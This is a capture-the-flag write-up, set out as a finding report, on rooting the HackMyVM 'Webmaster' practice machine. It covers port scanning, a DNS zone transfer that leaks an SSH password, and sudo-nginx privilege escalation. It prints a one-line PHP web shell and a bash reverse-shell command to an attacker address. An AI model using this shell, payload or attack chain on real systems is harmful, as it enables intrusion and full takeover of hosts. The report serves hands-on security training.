@@ -1,0 +1,84 @@
+📑 Finding Report: User Access and Privilege Escalation
+Machine: Webmaster – HackMyVM
+
+🟢 Executive Summary
+Severity: High
+Description:
+Access as the user john was gained through an AXFR DNS transfer that exposed a hidden password in the DNS server's record. Privilege escalation was then achieved by exploiting the NOPASSWD permissions to run the nginx command without restrictions, allowing a malicious PHP script to be uploaded, which provided a reverse shell with root privileges.
+
+🖥️ Scope and Environment
+Platform: HackMyVM
+Machine: Webmaster
+Assigned IP: 192.168.1.141
+Date of Analysis: 20/07/2025
+
+🛠 Tools Used
+nmap
+gobuster
+dig
+ssh
+curl
+ncat
+
+🔍 Finding Description
+4.1 Port Scanning
+
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.141  
+nmap -sCV -p22,80,53 192.168.1.141  
+Identified Ports:
+
+22/tcp – OpenSSH 7.9p1
+
+80/tcp – Apache httpd 2.4.38
+
+53/tcp – DNS (webmaster.hmv name server)
+
+4.2 Web Resource Discovery
+Accessing port 80 using Gobuster:
+
+gobuster dir -u http://192.168.1.141/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t 100 -k -r  
+Only the index.html file was found.
+
+4.3 DNS Information Exposure
+A AXFR zone transfer was performed using dig on DNS port 53:
+
+dig axfr @192.168.1.141 webmaster.hmv  
+Result:
+
+john.webmaster.hmv.604800 IN TXT "Myhiddenpazzword"  
+With this information, SSH access was obtained as john:
+
+ssh john@192.168.1.141  
+Password: Myhiddenpazzword  
+4.4 Privilege Escalation
+The sudo -l command was run to discover what commands could be executed with elevated privileges:
+
+john@webmaster:~$ sudo -l  
+Matching Defaults entries for john on webmaster:  
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
+
+User john may run the following commands on webmaster:  
+    (ALL : ALL) NOPASSWD: /usr/sbin/nginx  
+Conclusion: The user john could run nginx as any user without a password.
+
+4.5 Exploitation of Nginx for RCE
+A malicious PHP file called sudo.php was created on the web server:
+
+<?php system($_GET['cmd']); ?>
+This allowed system commands to be executed via the URL:
+
+curl 'http://webmaster.hmv/sudo.php?cmd=id'  
+The result showed execution with root privileges:
+
+uid=0(root) gid=0(root) groups=0(root)  
+A reverse shell as root was obtained using the following curl command:
+
+curl 'http://webmaster.hmv/sudo.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.142/1234 0>%261"  
+Listening with ncat:
+
+ncat -nlvp 1234  
+Result: Reverse shell with root access and the root flag.
+
+🏁 Flags Obtained
+user.txt
+root.txt
